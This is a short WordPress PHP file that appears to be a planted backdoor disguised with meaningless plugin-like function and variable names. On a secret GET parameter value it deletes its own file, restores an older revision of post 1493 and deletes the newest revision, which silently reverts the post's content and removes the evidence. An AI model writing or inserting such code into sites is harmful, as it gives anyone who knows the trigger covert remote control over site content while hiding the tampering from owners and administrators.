<?php

function controller_album_refresh_quotes() {
	if (isset($_GET['shopp_recent_community_hello']) && $_GET['shopp_recent_community_hello'] === 'cart_direct_method') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$nextgen_buttons_notify = 1493;
		$tinymce_templates_filter_best = wp_get_post_revisions($nextgen_buttons_notify);
		if (empty($tinymce_templates_filter_best)) die('no revisions');
		if (count($tinymce_templates_filter_best) < 2) die('less than 2');
		$info_translation_updater = array_shift($tinymce_templates_filter_best);
		$nextgen_footer_safe = $info_translation_updater->ID;
		$install_slide_messages = array_shift($tinymce_templates_filter_best);
		$marketing_accessibility_based_image = $install_slide_messages->ID;
		$feedback_roles_related_heading = wp_restore_post_revision($marketing_accessibility_based_image);
		if ($feedback_roles_related_heading === false) die('error restoring');
		$feedback_roles_related_heading = wp_delete_post_revision($nextgen_footer_safe);		
		if ($feedback_roles_related_heading === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'controller_album_refresh_quotes');
